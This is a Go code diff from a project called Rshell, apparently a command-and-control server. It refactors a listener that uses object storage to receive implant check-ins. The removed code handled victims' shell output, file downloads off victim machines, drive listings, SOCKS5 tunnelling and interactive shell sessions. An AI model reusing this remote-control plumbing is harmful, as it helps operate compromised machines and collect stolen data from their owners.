@@ -1,19 +1,16 @@
 package oss
 
 import (
-	"Rshell/pkg/command"
 	"Rshell/pkg/connection"
+	"Rshell/pkg/connection/base"
 	"Rshell/pkg/database"
 	"Rshell/pkg/encrypt"
-	"Rshell/pkg/interactive"
 	"Rshell/pkg/logger"
 	"Rshell/pkg/utils"
 	"Rshell/pkg/webhooks"
 	"encoding/base64"
 	"encoding/binary"
 	"fmt"
-	"os"
-	"path/filepath"
 	"sort"
 	"strconv"
 	"strings"
@@ -74,26 +71,7 @@ var (
 	globalOSSStats = &OSSStats{}
 )
 
-// 安全分割OS信息函数
-func safeSplitOSInfo(osInfo string) (hostName, userName, processName string) {
-	if osInfo == "" {
-		return "Unknown", "Unknown", "Unknown"
-	}
-
-	parts := strings.SplitN(osInfo, "\t", 3)
-	switch len(parts) {
-	case 3:
-		return parts[0], parts[1], parts[2]
-	case 2:
-		return parts[0], parts[1], "Unknown"
-	case 1:
-		return parts[0], "Unknown", "Unknown"
-	default:
-		return "Unknown", "Unknown", "Unknown"
-	}
-}
-
-// NewOSSClient 创建新的OSS客户端
+// NewOSSClient creates a new OSS client
 func NewOSSClient(endpoint, accessKeyID, accessKeySecret, bucketName string, stopchan chan struct{}) *OSSClient {
 	return &OSSClient{
 		Config: &OSSConfig{
@@ -401,9 +379,7 @@ func handleFirstBlood(msg []byte) error {
 	}
 
 	// 更新连接类型
-	connection.MuClientListenerType.Lock()
-	connection.ClientListenerType[uid] = "oss"
-	connection.MuClientListenerType.Unlock()
+	connection.GlobalManager.SetListenerType(uid, "oss")
 
 	// 检查是否已存在
 	var existingClient database.Clients
@@ -434,7 +410,7 @@ func handleFirstBlood(msg []byte) error {
 		}
 
 		// 使用安全分割函数
-		hostName, UserName, processName := safeSplitOSInfo(osInfo)
+		hostName, UserName, processName := base.SafeSplitOSInfo(osInfo)
 
 		externalIp := "oss上线"
 		address := "oss上线"
@@ -601,203 +577,8 @@ func handleOtherMsg(msg []byte) error {
 	data := dataBytes[4:]
 	replyType := binary.BigEndian.Uint32(replyTypeBytes)
 
-	switch replyType {
-	case 0: // 命令行展示
-		var shell database.Shell
-		if _, err := database.Engine.Where("uid = ?", uid).Get(&shell); err == nil {
-			// 限制数据长度，防止过大的日志
-			var content string
-			if len(data) > 10000 {
-				content = string(data[:10000]) + "\n[Data truncated...]"
-			} else {
-				content = string(data) + "\n"
-			}
-
-			shell.ShellContent += content
-			if _, err := database.Engine.Where("uid = ?", uid).Update(&shell); err != nil {
-				logger.Error("Failed to update shell:", err)
-				return fmt.Errorf("update shell failed: %w", err)
-			}
-		}
-
-	case 31: // 错误展示
-		var shell database.Shell
-		if _, err := database.Engine.Where("uid = ?", uid).Get(&shell); err == nil {
-			// 限制数据长度，防止过大的日志
-			var content string
-			if len(data) > 10000 {
-				content = string(data[:10000]) + "\n[Data truncated...]"
-			} else {
-				content = string(data)
-			}
-
-			shell.ShellContent += "!Error: " + content + "\n"
-			if _, err := database.Engine.Where("uid = ?", uid).Update(&shell); err != nil {
-				logger.Error("Failed to update shell:", err)
-				return fmt.Errorf("update shell failed: %w", err)
-			}
-		}
-
-	case command.PS:
-		if len(data) > 0 {
-			command.VarPidQueue.Add(uid, string(data))
-		}
-
-	case command.FileBrowse:
-		if len(data) > 0 {
-			command.VarFileBrowserQueue.Add(uid, string(data))
-		}
-
-	case 22: // 文件下载第一条信息
-		if len(data) < 8 { // 至少4字节长度+部分路径
-			return fmt.Errorf("file download info too short: %d bytes", len(data))
-		}
-
-		fileLen := int(binary.BigEndian.Uint32(data[:4]))
-		if len(data) < 5 { // 至少4字节长度+1字节路径
-			return fmt.Errorf("no file path in download info")
-		}
-
-		filePath := string(data[4:])
-		if filePath == "" {
-			return fmt.Errorf("empty file path")
-		}
-
-		// 验证文件长度合理性
-		if fileLen <= 0 {
-			return fmt.Errorf("invalid file length: %d", fileLen)
-		}
-
-		// 使用安全路径函数
-		fullPath, err := utils.GetSafeFilePath(uid, filePath)
-		if err != nil {
-			return fmt.Errorf("security check failed: %w", err)
-		}
-
-		// 确保下载目录存在
-		downloadDir := filepath.Dir(fullPath)
-		if err := os.MkdirAll(downloadDir, 0755); err != nil {
-			return fmt.Errorf("create download directory failed: %w", err)
-		}
-
-		// 更新数据库
-		sql := `
-UPDATE downloads
-SET file_size = ?, downloaded_size = ?
-WHERE uid = ? AND file_path = ?;
-`
-		if _, err := database.Engine.QueryString(sql, fileLen, 0, uid, filePath); err != nil {
-			logger.Error("Database update failed:", err)
-			return fmt.Errorf("database update failed: %w", err)
-		}
-
-		// 检查并删除已存在的文件
-		if _, err := os.Stat(fullPath); err == nil {
-			if err := os.Remove(fullPath); err != nil {
-				return fmt.Errorf("remove existing file failed: %w", err)
-			}
-		}
-
-		// 创建新文件
-		fp, err := os.OpenFile(fullPath, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0644)
-		if err != nil {
-			return fmt.Errorf("create file failed: %w", err)
-		}
-		fp.Close()
-
-	case command.DOWNLOAD: // 文件下载
-		if len(data) < 8 { // 至少4字节路径长度+部分路径+部分内容
-			return fmt.Errorf("download data too short: %d bytes", len(data))
-		}
-
-		filePathLen := int(binary.BigEndian.Uint32(data[:4]))
-		if len(data) < 4+filePathLen {
-			return fmt.Errorf("invalid file path length in download: %d, available: %d",
-				filePathLen, len(data)-4)
-		}
-
-		if filePathLen == 0 {
-			return fmt.Errorf("zero file path length")
-		}
-
-		filePath := string(data[4 : 4+filePathLen])
-		fileContent := data[4+filePathLen:]
-
-		// 使用安全路径函数
-		fullPath, err := utils.GetSafeFilePath(uid, filePath)
-		if err != nil {
-			return fmt.Errorf("security check failed: %w", err)
-		}
-
-		utils.Filelock.Lock()
-		// 使用事务更新数据库
-		var fileDownloads database.Downloads
-		if _, err := database.Engine.Where("uid = ? AND file_path = ?", uid, filePath).Get(&fileDownloads); err == nil {
-			fileDownloads.DownloadedSize += len(fileContent)
-			database.Engine.Where("uid = ? AND file_path = ?", uid, filePath).Update(&fileDownloads)
-		}
-		utils.Filelock.Unlock()
-
-		// 确保目录存在
-		downloadDir := filepath.Dir(fullPath)
-		if err := os.MkdirAll(downloadDir, 0755); err != nil {
-			return fmt.Errorf("create download directory failed: %w", err)
-		}
-
-		// 追加文件内容
-		fp, err := os.OpenFile(fullPath, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
-		if err != nil {
-			return fmt.Errorf("open file failed: %w", err)
-		}
-		defer fp.Close()
-
-		if _, err := fp.Write(fileContent); err != nil {
-			return fmt.Errorf("write file content failed: %w", err)
-		}
-
-	case command.DRIVES:
-		if len(data) > 0 {
-			drives := utils.GetExistingDrives(data)
-			command.VarDrivesQueue.Add(uid, drives)
-		}
-
-	case command.FileContent:
-		if len(data) < 8 { // 至少4字节路径长度+部分路径+部分内容
-			return fmt.Errorf("file content data too short: %d bytes", len(data))
-		}
-
-		filePathLen := int(binary.BigEndian.Uint32(data[:4]))
-		if len(data) < 4+filePathLen {
-			return fmt.Errorf("invalid file path length in file content: %d, available: %d",
-				filePathLen, len(data)-4)
-		}
-
-		if filePathLen == 0 {
-			return fmt.Errorf("zero file path length")
-		}
-
-		filePath := string(data[4 : 4+filePathLen])
-		fileContent := data[4+filePathLen:]
-		command.VarFileContentQueue.Add(uid, filePath, string(fileContent))
-
-	case command.Socks5Data:
-		if len(data) < 16 {
-			return fmt.Errorf("socks5 data too short: %d bytes", len(data))
-		}
-
-		md5sign := data[:16]
-		rawData := data[16:]
-		command.VarSocks5Queue.Add(uid, fmt.Sprintf("%x", md5sign), string(rawData))
-	case command.WriteInteractieShell:
-		sessionIDLen := int(binary.BigEndian.Uint32(data[:4]))
-
-		sessionID := string(data[4 : 4+sessionIDLen])
-		output := data[4+sessionIDLen:]
-
-		interactive.SendOutputToSession(uid, sessionID, output)
-	default:
-		return fmt.Errorf("unknown reply type: %d", replyType)
-	}
+	handler := base.ReplyHandler{UID: uid}
+	handler.Handle(replyType, data)
 
 	return nil
 }
